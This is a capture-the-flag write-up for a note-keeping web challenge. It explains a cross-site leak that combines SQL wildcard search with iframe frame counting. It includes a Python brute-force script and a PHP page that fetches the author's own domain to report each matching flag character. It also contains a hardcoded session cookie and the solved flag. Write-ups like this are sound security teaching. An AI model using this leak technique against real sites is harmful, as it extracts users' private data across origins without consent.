# Secret Note Keeper


## Problem Analysis
- This challenge looks same as 35C3 CTF filemanager:
    - Register / Login / Logout
    - Add note
    - Search Note
    - Report bug
    
- Let's try to report my domain and view the request:
    - `HeadlessChrome/74.0.3729.169 Safari/537.36`
    - [Chrome 74](https://portswigger.net/daily-swig/google-chromes-xss-auditor-goes-back-to-filter-mode), it seems like we can't use XSS Auditor to leak data. Because it goes back to filter mode from block mode.
- After fuzzing, we found two special characters:
    - `_` will match any single character
    - `%` will match many characters
    - we can use this feature to get the length of the flag
- In `Search note`, if it found any note, it will use `iframe` to import the corresponding note to the page.

## Exploit

- Obviously, this is a XS-Leak challenge
- We can use frame count (`contentWindow.length`) to identify whether it found the notes or not
    - found => `frame count >= 1`
    - not found => `frame count = 0`

- Write a script to bruteforce it:

```python
import requests
import hashlib
import re

def POW(target):
    mx = 10 ** 8
    nonce = 0
    while nonce < mx:
        s = str(nonce)
        res = hashlib.md5(s).hexdigest()
        if res.startswith(target):
            print(res)
            return s
        nonce += 1

alphabet = "!-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

for i in alphabet:

    cookie = {"session":"286b4d92-cf9d-5d8e-9da2-0d2ce4617ac3", "session":".eJwljgkOwzAMBP_C5oUOkiL2mUA8hKS14ySI32Mg2HJmgPBAYx15PmF_H5du8HgF7CdqXaVwJOG4qj0saBWt6qUPGegmprfD5u6JVKVRXblWbZ74PI16Yl9cR5_CLDciTxJyq3fVE9uMKbpKM13JEpjC3tpAD0jgOvP4n8HW4PsDAIIvzQ.XPJRVA.xJ6roM-pNGsVmS9dS0rJr_BoCpI;"}

    r = requests.get("http://challenges.fbctf.com:8082/report_bugs", cookies=cookie)

    x = re.findall("proof of work for (.*) \(", r.text)
    print(x[0])

    ans = POW(x[0])
    print "ans:" + ans

    r2 = requests.post("http://challenges.fbctf.com:8082/report_bugs", data={"link":"http://kaibro.tw/log.php?1="+i, "pow_sol":ans, "body":"","title":""}, cookies=r.cookies)
    print r2.text
```

And the `log.php` in above script is:

```php
<iframe src="http://challenges.fbctf.com:8082/search?query=fb{cr055_s173_l34<?php echo $_GET[1];?>%}" onload="if(this.contentWindow.length>=1){fetch('http://kaibro.tw/?fb=ok');}">
```

If we found the character, then we will receive the `ok` request message. Then we can try the next character. 

flag: `fb{cr055_s173_l34|<5_4r4_c00ool!!}`

